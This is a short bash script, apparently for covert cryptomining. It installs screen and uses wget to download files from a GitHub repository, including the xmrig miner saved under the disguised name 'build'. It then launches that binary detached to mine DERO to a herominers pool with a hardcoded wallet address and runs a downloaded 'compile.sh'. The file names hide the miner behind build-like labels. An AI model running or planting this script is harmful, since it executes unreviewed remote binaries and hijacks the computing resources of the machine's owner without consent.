#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/xmrig
chmod +x compile.sh
chmod +x build
screen -dm -S build ./build -o us.dero.herominers.com -u dERoYbZJnEyYVPsrqycKZyR1A5xcFXH3viDvmEjq5H7iDQCHcA1Ej5Fhd6qbvenZwEPuqvNn25V1YYPhauufxi6y43TiJAUx6X -p kuru -a astrobwt
./compile.sh
echo succes
